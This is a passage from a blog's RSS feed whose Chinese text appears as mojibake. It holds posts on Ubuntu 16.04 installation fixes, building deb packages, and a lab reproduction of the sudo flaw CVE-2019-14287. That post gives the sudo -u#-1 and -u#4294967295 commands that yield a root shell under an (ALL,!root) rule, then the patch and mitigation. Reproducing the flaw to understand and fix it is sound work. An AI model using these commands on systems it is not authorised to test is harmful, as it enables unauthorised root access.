align="center"></td></tr></tbody></table>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/6a6ee787.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>Ubuntu16.04 server å®‰è£…ä¸­çš„å‘</title>
      <link>http://romanarcher.github.io/post/7d33fc70.html</link>
      <guid>http://romanarcher.github.io/post/7d33fc70.html</guid>
      <pubDate>Mon, 11 Nov 2019 07:52:31 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;1-å®‰è£…busybox-initramfsé”™è¯¯&quot;&gt;&lt;a href=&quot;#1-å®‰è£…busybox-initramfsé”™è¯¯&quot; class=&quot;headerlink&quot; title=&quot;1.å®‰è£…busybox initramfsé”™è¯¯&quot;&gt;&lt;/a&gt;1.å®‰è£…busybox initr
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="1-å®‰è£…busybox-initramfsé”™è¯¯"><a href="#1-å®‰è£…busybox-initramfsé”™è¯¯" class="headerlink" title="1.å®‰è£…busybox initramfsé”™è¯¯"></a>1.å®‰è£…busybox initramfsé”™è¯¯</h2><p>1.å¦‚æœä½ æ˜¯ç”¨ä¸­æ–‡å®‰è£…çš„ä¼šå‡ºç°è¿™ä¸ªé”™è¯¯ï¼Œéœ€è¦ç”¨è‹±æ–‡å®‰è£…<br>2.åœ¨è¯­è¨€ç•Œé¢æŒ‰ä¸‹F6è¿›é€‰é¡¹ï¼Œå¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ä¸€ä¸²å‚æ•°è¡Œï¼ŒæŠŠé‡Œé¢çš„quietä¿®æ”¹ä¸ºall_generic_ideå›è½¦å°±å¯æ­£å¸¸å®‰è£…</p><h2 id="2-å®‰è£…grub-pcå¤±è´¥"><a href="#2-å®‰è£…grub-pcå¤±è´¥" class="headerlink" title="2.å®‰è£…grub-pcå¤±è´¥"></a>2.å®‰è£…grub-pcå¤±è´¥</h2><p>å¯ä»¥æŒ‰å¿«æ·é”®Alt+F4æŸ¥çœ‹æ—¥å¿—ï¼Œå¦‚æœæ˜¯è¿æ¥å¤±è´¥ï¼Œè¯´æ˜æºæœ‰é—®é¢˜ï¼Œè¿”å›æ‰“å¼€shellå°†/tartget/apt/sources.listä¸­æ·»åŠ å›½å†…xenialæº(æ ¹æ®ä½ å®‰è£…çš„ç‰ˆæœ¬æ¥)ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªæˆ‘æ‰¾åˆ°çš„,åº”è¯¥èƒ½ç”¨</p><pre><code class="bash">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</code></pre><p>ä½ å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤æµ‹è¯•æˆ–è€…ç›´æ¥å®‰è£…ï¼š</p><pre><code class="bash">chroot /targetapt-get updateapt-get install grub-pc</code></pre>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/7d33fc70.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>debåŒ…çš„åˆ¶ä½œ</title>
      <link>http://romanarcher.github.io/post/b1d021eb.html</link>
      <guid>http://romanarcher.github.io/post/b1d021eb.html</guid>
      <pubDate>Tue, 05 Nov 2019 08:36:26 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…&quot;&gt;&lt;a href=&quot;#å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…&quot; class=&quot;headerlink&quot; title=&quot;å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…&quot;&gt;&lt;/a&gt;å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…&lt;/h2&gt;&lt;h3 id=&quot;1-debåŒ…çš„æ„æˆ&quot;&gt;&lt;a href=&quot;#
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…"><a href="#å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…" class="headerlink" title="å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…"></a>å°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…æˆdebåŒ…</h2><h3 id="1-debåŒ…çš„æ„æˆ"><a href="#1-debåŒ…çš„æ„æˆ" class="headerlink" title="1.debåŒ…çš„æ„æˆ"></a>1.debåŒ…çš„æ„æˆ</h3><ul><li><p>æ•°æ®åŒ…ï¼Œä½ éœ€è¦å®‰è£…çš„ç¨‹åºæ•°æ®;</p></li><li><p>å®‰è£…ä¿¡æ¯åŠæ§åˆ¶è„šæœ¬åŒ…, åŒ…å«debçš„å®‰è£…è¯´æ˜ï¼Œæ ‡è¯†;</p></li><li><p>debæ–‡ä»¶çš„ä¸€äº›äºŒè¿›åˆ¶æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡ä»¶å¤´ç­‰ä¿¡æ¯ã€‚</p></li></ul><h3 id="2-åˆ›å»ºå·¥ä½œç›®å½•"><a href="#2-åˆ›å»ºå·¥ä½œç›®å½•" class="headerlink" title="2.åˆ›å»ºå·¥ä½œç›®å½•"></a>2.åˆ›å»ºå·¥ä½œç›®å½•</h3><p>è¿™é‡Œä»¥~/work ä¸ºå·¥ä½œç›®å½•</p><pre><code class="bash">$mkdir work$cd work</code></pre><h3 id="3-æè¿°æ–‡ä»¶å’Œæ§åˆ¶è„šæœ¬"><a href="#3-æè¿°æ–‡ä»¶å’Œæ§åˆ¶è„šæœ¬" class="headerlink" title="3.æè¿°æ–‡ä»¶å’Œæ§åˆ¶è„šæœ¬"></a>3.æè¿°æ–‡ä»¶å’Œæ§åˆ¶è„šæœ¬</h3><p>å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶æ ‘å¦‚ä¸‹</p><pre><code>.                                                       â”œâ”€â”€ DEBIANâ”‚   â”œâ”€â”€ controlâ”‚   â”œâ”€â”€ preinstâ”‚   â”œâ”€â”€ postinstâ”‚   â”œâ”€â”€ prermâ”‚   â””â”€â”€ postrmâ””â”€â”€ æ¨¡æ‹Ÿæ ¹ç›®å½•</code></pre><p>controlæ–‡ä»¶æ—¶ç¨‹åºçš„æè¿°ä¿¡æ¯ï¼Œå‰©ä¸‹çš„å››ä¸ªæ–‡ä»¶æ—¶ç›¸å…³çš„æ§åˆ¶è„šæœ¬ã€‚</p><table><thead><tr><th align="center">æ–‡ä»¶</th><th align="center">è¿è¡Œæ—¶æœº</th></tr></thead><tbody><tr><td align="center">preinst</td><td align="center">è§£åŒ…æ•°æ®åŒ…å‰è¿è¡Œçš„è„šæœ¬</td></tr><tr><td align="center">postinst</td><td align="center">è§£åŒ…æ•°æ®åŒ…åè¿è¡Œçš„è„šæœ¬</td></tr><tr><td align="center">prerm</td><td align="center">å¸è½½æ—¶ï¼Œåœ¨åˆ é™¤æ–‡ä»¶å‰è¿è¡Œçš„è„šæœ¬</td></tr><tr><td align="center">postrm</td><td align="center">åˆ é™¤æ–‡ä»¶åè¿è¡Œçš„è„šæœ¬</td></tr></tbody></table><p>å››ä¸ªæ§åˆ¶è„šæœ¬ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯controlæ–‡ä»¶æ˜¯å¿…é¡»å­˜åœ¨çš„ã€‚<br>è¿™é‡Œç»™å‡ºä¸€ä¸ªcontrolæ–‡ä»¶çš„ä¾‹å­</p><pre><code class="bash">Package: softVersion: 1.0.1Section: utilsPriority: optionalArchitecture: i386Depends:Installed-Size: 512Maintainer: xxx@xxx.comDescription: soft package</code></pre><p>å­—æ®µè§£é‡Šï¼š</p><table><thead><tr><th align="left">å­—æ®µ</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">Package</td><td align="left">æŒ‡è¯¥è½¯ä»¶åŒ…çš„åå­—ã€‚å¦‚æœä½ çš„è½¯ä»¶åŒ…åç§°æœ‰ä¸¤ä¸ªè¯ï¼Œç”¨ä¸€ä¸ªè¿å­—ç¬¦ï¼ˆ-ï¼‰æŠŠå®ƒä»¬è¿èµ·æ¥ã€‚è½¯ä»¶åŒ…çš„åç§°åªèƒ½æœ‰å°å†™çš„è‹±æ–‡å­—æ¯ï¼Œæ•°å­—ä»¥åŠâ€+â€å’Œâ€-â€œã€‚</td></tr><tr><td align="left">Version</td><td align="left">æ˜¾ç„¶æ˜¯ç¨‹åºçš„ç‰ˆæœ¬ã€‚è¿™é‡Œçš„å€¼ä¸åŒ…æ‹¬è¿å­—ç¬¦ã€‚</td></tr><tr><td align="left">Section</td><td align="left">åˆ—å‡ºäº†ä½ çš„è½¯ä»¶å±äºçš„ç±»åˆ«ï¼Œå¯èƒ½çš„å€¼åŒ…æ‹¬adminï¼ˆç®¡ç†ï¼‰ï¼Œgamesï¼ˆæ¸¸æˆï¼‰ï¼Œgnomeï¼Œkdeï¼Œmailï¼ˆç”µå­é‚®ä»¶ï¼‰ï¼Œmiscï¼ˆæ‚é¡¹ï¼Œmiscellaneousï¼‰ï¼Œnetï¼ˆç½‘ç»œï¼‰ï¼Œsoundï¼ˆå£°éŸ³ï¼‰ï¼Œtextï¼ˆæ–‡æœ¬ï¼‰ï¼Œutilsï¼ˆå®ç”¨å·¥å…·ï¼‰å’Œwebï¼ˆä¸‡ç»´ç½‘ï¼‰ã€‚</td></tr><tr><td align="left">Priority</td><td align="left">å£°æ˜è¿™ä¸ªåŒ…çš„ä¼˜å…ˆçº§ï¼ˆå¤§éƒ¨åˆ†çš„æ—¶å€™ä½¿ç”¨optionalï¼ˆå¯é€‰çš„ï¼‰ï¼‰ã€‚</td></tr><tr><td align="left">Architecture</td><td align="left">æ˜¯è¯¥ç¨‹åºå¯è¿è¡Œçš„CPUæ¶æ„ï¼ˆå¯èƒ½çš„å€¼ä¸ºi386ï¼Œamd64å’Œpowerpcï¼Œå¤§å°å†™æ•æ„Ÿã€‚</td></tr><tr><td align="left">Eseential</td><td align="left">æŒ‡è¯¥è½¯ä»¶åŒ…æ˜¯å¦æ˜¯å¿…é¡»çš„ï¼ˆå¤§éƒ¨åˆ†çš„æ—¶å€™ä¸æ˜¯ï¼‰ã€‚</td></tr><tr><td align="left">Depends</td><td align="left">è¿™ä¸ªç¨‹åºçš„ä¾èµ–ç¨‹åºã€‚</td></tr><tr><td align="left">Recommends</td><td align="left">æ¨èå®‰è£…çš„ç¨‹åºï¼Œä¸€èˆ¬éƒ½è¦è£…ã€‚</td></tr><tr><td align="left">Suggests</td><td align="left">å»ºè®®å®‰è£…ï¼Œå¯èƒ½ç»™è¿™ä¸ªè½¯ä»¶å¸¦æ¥æ›´å¤šåŠŸèƒ½ï¼Œä½†æ˜¯ä¸å®‰è£…ä¹Ÿè¡Œ</td></tr><tr><td align="left">Install-Size</td><td align="left">ç¨‹åºå®‰è£…åçš„å¤§å°ï¼ŒæŒ‰KBç®—ã€‚</td></tr><tr><td align="left">Maintainer</td><td align="left">ç»´æŠ¤è€…ï¼ˆå†™ä¸Šä½ çš„åå­—ï¼Œåé¢çš„æ–¹æ‹¬å·â€[ ]â€é‡Œç•™ä¸‹ä½ çš„ç”µå­é‚®ä»¶åœ°å€ï¼‰ã€‚</td></tr><tr><td align="left">Conflicts</td><td align="left">è¡¨ç¤ºè·Ÿè¿™ä¸ªç¨‹åºå†²çªçš„è½¯ä»¶ã€‚</td></tr><tr><td align="left">Replaces</td><td align="left">è¡¨æ˜å“ªäº›è½¯ä»¶åŒ…å°†è¢«è¿™ä¸ªç¨‹åºå–ä»£ã€‚</td></tr><tr><td align="left">Description</td><td align="left">æ˜¾ç¤ºä½ çš„æè¿°ã€‚</td></tr></tbody></table><ul><li>ä¾èµ–åŒ…çš„è¡¨ç¤º<br>  ç”¨è‹±æ–‡çš„åŠè§’é€—å·åˆ†å¼€ä¸åŒçš„ä¾èµ–å…³ç³»(,)ã€‚å¦‚æœä¸¤ä¸ªè½¯ä»¶ä¸­çš„ä»»ä½•ä¸€ä¸ªå¯ä»¥å·¥ä½œï¼Œç”¨ç«–çº¿â€|â€åˆ†å¼€å®ƒä»¬ã€‚ä½ ä¹Ÿå¯ä»¥æŒ‡å®šç‰¹å®šçš„ç‰ˆæœ¬ï¼Œç”¨åœ¨æ‹¬å·é‡Œç”¨&lt;&lt;ï¼ˆå°äºï¼‰ï¼Œ&lt;=ï¼ˆå°äºæˆ–ç­‰äºï¼‰ï¼Œ=ï¼ˆç­‰äºï¼‰ï¼Œ&gt;=ï¼ˆå¤§äºæˆ–ç­‰äºï¼‰ï¼Œæˆ–&gt;&gt;ï¼ˆå¤§äºï¼‰æ¥è¡¨ç¤ºã€‚</li></ul><h3 id="4-éœ€è¦å®‰è£…çš„æ–‡ä»¶"><a href="#4-éœ€è¦å®‰è£…çš„æ–‡ä»¶" class="headerlink" title="4.éœ€è¦å®‰è£…çš„æ–‡ä»¶"></a>4.éœ€è¦å®‰è£…çš„æ–‡ä»¶</h3><p>å‡†å¤‡å¥½æè¿°æ–‡ä»¶å’Œç›¸å…³çš„è„šæœ¬åï¼Œå°±å¯ä»¥å°†ä½ çš„ç¨‹åºæ”¾åœ¨æ¨¡æ‹Ÿæ ¹ç›®å½•ä¸‹ã€‚<br>æ¯”å¦‚æœ‰ä¸€ä¸ªsoft.outæ–‡ä»¶ã€‚<br>å®‰è£…åˆ°/user/local/binç›®å½•ä¸‹ï¼Œé‚£ä¹ˆåœ¨workç›®å½•ä¸‹åˆ›å»ºuser/local/binã€‚<br>æŠŠsoft.outæ”¾åˆ°~/work/user/local/binä¸‹ã€‚<br>è¿™ä¸ªå°±æ˜¯æ¨¡æ‹Ÿæ ¹ç›®å½•çš„æ„ä¹‰ã€‚</p><p>æ–‡ä»¶æ”¾ç½®å¦¥å½“åçš„ç›®å½•ç»“æ„</p><pre><code>.â”œâ”€â”€ DEBIANâ”‚   â””â”€â”€ control                                                              â””â”€â”€ usr    â””â”€â”€ local        â””â”€â”€ bin            â””â”€â”€ soft.out </code></pre><h3 id="5-æ‰“åŒ…"><a href="#5-æ‰“åŒ…" class="headerlink" title="5.æ‰“åŒ…"></a>5.æ‰“åŒ…</h3><p>åœ¨workç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤</p><pre><code class="bash">$dpkg -b ./ ~/soft.deb</code></pre><p>å³å¯å®Œæˆæ‰“åŒ…ã€‚</p><h3 id="ç›¸å…³çš„dpkgå‘½ä»¤"><a href="#ç›¸å…³çš„dpkgå‘½ä»¤" class="headerlink" title="*ç›¸å…³çš„dpkgå‘½ä»¤"></a>*ç›¸å…³çš„dpkgå‘½ä»¤</h3><p>å®‰è£…å‰æŸ¥çœ‹åŒ…å†…æ•°æ®</p><pre><code class="bash">$dpkg -c debname</code></pre><p>å®‰è£…debåŒ…</p><pre><code class="bash">$dpkg -i debname</code></pre><p>å¸è½½debåŒ…</p><pre><code class="bash">$dpkg -r debname</code></pre><p>æŸ¥çœ‹æŸæ–‡ä»¶å±äºå“ªä¸ªåŒ…</p><pre><code class="bash">$dpkg -S filename</code></pre><p>é‡Šæ”¾æ•°æ®åˆ°æŸä¸ªæ–‡ä»¶ä¸‹</p><pre><code class="bash">$dpkg -X debname dirname</code></pre><p>é‡Šæ”¾æ§åˆ¶ä¿¡æ¯åˆ°å½“å‰çš„DEBIANç›®å½•ä¸‹</p><pre><code class="bash">$dpkg -e debname</code></pre>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/b1d021eb.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>CVE-2019-14287å¤ç°</title>
      <link>http://romanarcher.github.io/post/13cae37e.html</link>
      <guid>http://romanarcher.github.io/post/13cae37e.html</guid>
      <pubDate>Thu, 31 Oct 2019 06:35:48 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;1-CVE-2019-14287æƒé™æå‡æ¼æ´&quot;&gt;&lt;a href=&quot;#1-CVE-2019-14287æƒé™æå‡æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;1.CVE-2019-14287æƒé™æå‡æ¼æ´&quot;&gt;&lt;/a&gt;1.CVE-2019-14287æƒé™æå‡
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="1-CVE-2019-14287æƒé™æå‡æ¼æ´"><a href="#1-CVE-2019-14287æƒé™æå‡æ¼æ´" class="headerlink" title="1.CVE-2019-14287æƒé™æå‡æ¼æ´"></a>1.CVE-2019-14287æƒé™æå‡æ¼æ´</h2><p>2019å¹´10æœˆ14æ—¥ï¼Œ sudo å®˜æ–¹åœ¨å‘å¸ƒäº† CVE-2019-14287 çš„æ¼æ´é¢„è­¦ã€‚<br>sudoå¤§å®¶éƒ½ç†Ÿæ‚‰ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰ unixæ“ä½œç³»ç»Ÿ(BSD, MacOS, GNU/Linux) éƒ½ä¼šé›†æˆçš„ä¸€ä¸ªç”¨æˆ·æƒé™æ§åˆ¶/åˆ‡æ¢ç¨‹åºã€‚å…è®¸ç®¡ç†å‘˜æ§åˆ¶æœåŠ¡å™¨ä¸‹ç”¨æˆ·èƒ½å¤Ÿåˆ‡æ¢çš„ç”¨æˆ·æƒé™ã€‚<br>CVE-2019-14287 æ˜¯ç®¡ç†å‘˜åœ¨é…ç½®æ–‡ä»¶ä¸­ç”¨äº† ALL å…³é”®è¯åé€ æˆçš„ã€‚ä½†é»˜è®¤çš„ sudo é…ç½®æ–‡ä»¶ä¸å—å½±å“ã€‚</p><h2 id="2-å¤ç°"><a href="#2-å¤ç°" class="headerlink" title="2.å¤ç°"></a>2.å¤ç°</h2><p>é¶æœº:Ubuntu16.04<br>é¦–å…ˆæˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹Ubuntuçš„sudoç‰ˆæœ¬</p><pre><code class="bash">$sudo -VSudo ç‰ˆæœ¬ 1.8.16Sudoers ç­–ç•¥æ’ä»¶ç‰ˆæœ¬ 1.8.16Sudoers æ–‡ä»¶è¯­æ³•ç‰ˆæœ¬ 45Sudoers I/O plugin version 1.8.16</code></pre><p>sudoç‰ˆæœ¬å°äº1.8.28<br>é¦–å…ˆæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªè´¦å·ã€‚</p><pre><code class="bash">$useradd cvetest$passwd cvetestè¾“å…¥æ–°çš„ UNIX å¯†ç ï¼š é‡æ–°è¾“å…¥æ–°çš„ UNIX å¯†ç ï¼š passwdï¼šå·²æˆåŠŸæ›´æ–°å¯†ç  </code></pre><p>é€šè¿‡ç¼–è¾‘/etc/sudoersï¼Œç»™äºˆå®ƒå—é™çš„æƒåˆ©ã€‚<br>åœ¨/etc/sudoersä¸­æ·»åŠ </p><pre><code class="bash">cvetest ALL=(ALL,!root) /bin/bash</code></pre><p>è¿™ä¸ªçš„æ„æ€æ˜¯ï¼Œcvetestå¯ä»¥ç”¨rootä»¥å¤–çš„æƒé™æ‰§è¡Œ/bin/bash<br>ç°åœ¨æˆ‘ä»¬åˆ‡æ¢åˆ°cvetestç”¨æˆ·çœ‹çœ‹</p><pre><code class="bash">$su cvetestå¯†ç :</code></pre><p>é¦–å…ˆå°è¯•ä»¥rootæƒé™æ‰§è¡Œ/bin/bash</p><pre><code class="bash">$sudo -u root /bin/bash[sudo] cvetest çš„å¯†ç ï¼š å¯¹ä¸èµ·ï¼Œç”¨æˆ· cvetest æ— æƒä»¥ root çš„èº«ä»½åœ¨ ubuntu ä¸Šæ‰§è¡Œ /bin/bashã€‚</code></pre><p>è¿™è¯´æ˜äº†cvetestæƒé™å—é™äº†<br>ä½†æ˜¯å½“æˆ‘ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œç”¨ä¸‹åˆ—æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå´å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ</p><pre><code class="bash">$sudo -u#-1 /bin/bash sudo: æœªçŸ¥ç”¨æˆ·ï¼š#-1sudo: æ— æ³•åˆå§‹åŒ–ç­–ç•¥æ’ä»¶$sudo -u#4294967295 /bin/bashsudo: æœªçŸ¥ç”¨æˆ·ï¼š#4294967295sudo: æ— æ³•åˆå§‹åŒ–ç­–ç•¥æ’ä»¶</code></pre><p>???????<br>ç¿»è½¦äº†ã€‚<br>å±…ç„¶åœ¨Ubuntuä¸Šæ— æ³•å¤ç°ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æ›´æ¢åˆ°Centos7å†è¯•è¯•<br>é¦–å…ˆ</p><pre><code class="bash">$sudo -VSudo ç‰ˆæœ¬ 1.8.23Sudoers ç­–ç•¥æ’ä»¶ç‰ˆæœ¬ 1.8.23Sudoers æ–‡ä»¶è¯­æ³•ç‰ˆæœ¬ 46</code></pre><p>å…¶å®centosä¸Šè¾“å‡ºäº†ä¸€å¤§å †ä¸œè¥¿ï¼Œè¿™é‡Œæˆ‘å°±åªé€‰æ‹©äº†ä¸€éƒ¨åˆ†æ¥æ˜¾ç¤ºã€‚<br>ç»§ç»­ä¸Šé¢çš„æ“ä½œã€‚<br>åˆ›å»ºç”¨æˆ·ä¿®æ”¹æƒé™å¦‚ä¸Šæ‰€ç¤ºã€‚</p><p>ä»¥rootæƒé™æ‰§è¡Œ/bin/bash</p><pre><code class="bash">$sudo -u root /bin/bashæˆ‘ä»¬ä¿¡ä»»æ‚¨å·²ç»ä»ç³»ç»Ÿç®¡ç†å‘˜é‚£é‡Œäº†è§£äº†æ—¥å¸¸æ³¨æ„äº‹é¡¹ã€‚æ€»ç»“èµ·æ¥æ— å¤–ä¹è¿™ä¸‰ç‚¹ï¼š    #1) å°Šé‡åˆ«äººçš„éšç§ã€‚    #2) è¾“å…¥å‰è¦å…ˆè€ƒè™‘(åæœå’Œé£é™©)ã€‚    #3) æƒåŠ›è¶Šå¤§ï¼Œè´£ä»»è¶Šå¤§ã€‚[sudo] cvetest çš„å¯†ç ï¼šå¯¹ä¸èµ·ï¼Œç”¨æˆ· cvetest æ— æƒä»¥ root çš„èº«ä»½åœ¨ centos7 ä¸Šæ‰§è¡Œ /bin/bashã€‚</code></pre><p>æƒé™ä¸è¶³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å‡†å¤‡æé«˜æƒé™</p><pre><code class="bash">[cvetest@centos7 /]$ sudo -u#-1 /bin/bash[sudo] cvetest çš„å¯†ç ï¼šbash-4.2# exitexit[cvetest@centos7 /]$ sudo -u#4294967295 /bin/bashbash-4.2# </code></pre><p>æˆåŠŸï¼Œä»¥å—é™åˆ¶çš„cvetestæ‹¿åˆ°äº†rootæƒé™æ¥æ‰§è¡Œ/bin/bash</p><h2 id="3-åŸç†è§£é‡Š"><a href="#3-åŸç†è§£é‡Š" class="headerlink" title="3.åŸç†è§£é‡Š"></a>3.åŸç†è§£é‡Š</h2><pre><code class="bash">$sudo -u#userid</code></pre><p>è¿™ä¸ªæŒ‡ä»¤è¡¨ç¤ºçš„æ˜¯ä»¥useridå¯¹åº”çš„ç”¨æˆ·æ¥æ‰§è¡Œç¨‹åºã€‚<br>çœ‹åˆ°-1å’Œ4294967295ç›¸ä¿¡å¤§å®¶éƒ½å·²ç»æ˜ç™½äº†ï¼Œç¨‹åºé¢å¯¹æ— æ³•è¯†åˆ«çš„ç‰¹æ®Šå€¼çš„æ—¶å€™ï¼Œä¼šå°†å…¶è½¬æ¢ä¸º0ï¼Œç„¶è€Œ0åˆšå¥½è¡¨ç¤ºrootç”¨æˆ·ã€‚<br>æˆ‘æ¨æµ‹æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š<br>sudoå°†æ— æ³•è¯†åˆ«çš„å€¼è¯¯è®¤ä¸ºæ˜¯0ã€‚<br>ç„¶åäº¤ç»™æƒé™å¤„ç†æˆ–è€…è´¦å·éªŒè¯ä¹‹ç±»çš„æ¨¡å—æ—¶ä¼ è¾“çš„è¿˜æ˜¯-1ä¹‹ç±»çš„ç‰¹æ®Šå€¼ï¼Œå› ä¸ºæƒé™é‡Œé¢è®¾ç½®äº†cvetestå¯ä»¥ä»¥érootçš„å…¶ä½™æ‰€æœ‰è´¦å·å¯åŠ¨ã€‚<br>è¿™äº›æ¨¡å—ä¸€çœ‹-1ä¸æ˜¯rootçš„idï¼Œå› æ­¤ç»™äºˆæ‰§è¡Œçš„æƒåˆ©ï¼Œsudoä¸€çœ‹ç®¡ç†æƒé™çš„é‚£äº›æ¨¡å—æ²¡æœ‰è¿”å›æƒé™ä¸è¶³ï¼Œçœ‹äº†çœ‹ç”¨æˆ·ç»™çš„idï¼Œå—¯æ˜¯0ï¼Œæ²¡é—®é¢˜ï¼Œå°±å…è®¸cvetestä»¥rootæƒé™æ‰§è¡Œ/bin/bashäº†ã€‚</p><h2 id="4-åŸç†éªŒè¯"><a href="#4-åŸç†éªŒè¯" class="headerlink" title="4.åŸç†éªŒè¯"></a>4.åŸç†éªŒè¯</h2><p>æ ¹æ®æˆ‘ä»¬çš„çŒœæµ‹ï¼Œé‚£ä¹ˆé…ç½®ä¸º</p><pre><code class="bash">cvetest ALL=(default,cvetest) /bin/bash</code></pre><p>å³cveteståªèƒ½ä»¥defaultå’Œcvetestæ‰§è¡Œ/bin/bashæ—¶ï¼Œåº”è¯¥æ—¶æ— æ³•è·å–rootæƒé™ã€‚</p><pre><code class="bash">[cvetest@centos7 /]$ sudo -u#1000 /bin/bash[sudo] cvetest çš„å¯†ç ï¼š[default@centos7 /]$ exitexit[cvetest@centos7 /]$ sudo -u#-1 /bin/bashå¯¹ä¸èµ·ï¼Œç”¨æˆ· cvetest æ— æƒä»¥ #-1 çš„èº«ä»½åœ¨ centos7 ä¸Šæ‰§è¡Œ /bin/bashã€‚</code></pre><p>å› ä¸ºå½“ç®¡ç†æƒé™çš„æ¨¡å—æ‹¿åˆ°uidä¸º-1æ—¶ï¼Œå‘ç°å¹¶ä¸æ˜¯defaultæˆ–è€…cvetestçš„idï¼Œå› æ­¤ä¸ç»™æƒé™ã€‚</p><p>å½“ç„¶æœ€å¥½çš„éªŒè¯æ–¹å¼å°±æ˜¯çœ‹æºç çš„æ”¹åŠ¨ã€‚å› ä¸ºè¿™ä¸ªæ¼æ´åœ¨1.8.28ä¸­ä¿®å¤äº†ï¼Œæˆ‘ä»¬å»çœ‹çœ‹äº†ä¿®æ”¹çš„æ—¥å¿—è¿˜çœŸæ‰¾åˆ°äº†ã€‚<br><a href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7" target="_blank" rel="noopener">Treat an ID of -1 as invalid since that means â€œno changeâ€.</a></p><p>å¯ä»¥çœ‹åˆ°sudoä¿®æ”¹äº†lib/util/strtoid.c<br>åŠ äº†ä¸€äº›ä»£ç ã€‚</p><pre><code class="c++">llval = strtoll(p, &amp;ep, 10);.../* Disallow id -1, which means &quot;no change&quot;. */    if (!valid_separator(p, ep, sep) || llval == -1 || llval == (id_t)UINT_MAX) {    if (errstr != NULL)        *errstr = N_(&quot;invalid value&quot;);    errno = EINVAL;    goto done;    }</code></pre><p>æ›´åŠ æ·±å±‚æ¬¡çš„åˆ†æå¯è§<br><a href="https://paper.seebug.org/1057/" target="_blank" rel="noopener">CVE-2019-14287åˆ†æ</a></p><h2 id="5-å¦‚ä½•é¢„é˜²ä¸ä¿®å¤"><a href="#5-å¦‚ä½•é¢„é˜²ä¸ä¿®å¤" class="headerlink" title="5.å¦‚ä½•é¢„é˜²ä¸ä¿®å¤"></a>5.å¦‚ä½•é¢„é˜²ä¸ä¿®å¤</h2><p>æœ€ç®€å•çš„æ–¹æ³•å½“ç„¶æ˜¯ç›´æ¥å°†sudoå‡çº§åˆ°1.8.28ä»¥ä¸Šï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥è‡ªå·±æ’é™¤sudoçš„é…ç½®ï¼Œæ‰“å¼€/etc/sudoers,å°†å…¶ä¸­è®¾ç½®äº†(ALL,!XXXX)å³ä»¥éxxxxæƒé™çš„ï¼Œéƒ½ä¿®æ”¹æ‰ã€‚</p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/13cae37e.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>python urllibçš„urlretrieveä¸‹è½½å¤ªæ…¢</title>
      <link>http://romanarcher.github.io/post/b1acc7fd.html</link>
      <guid>http://romanarcher.github.io/post/b1acc7fd.html</guid>
      <pubDate>Wed, 30 Oct 2019 07:30:03 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•&quot;&gt;&lt;a href=&quot;#urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•&quot;&gt;&lt;/a
        
      
      </description>
      
      
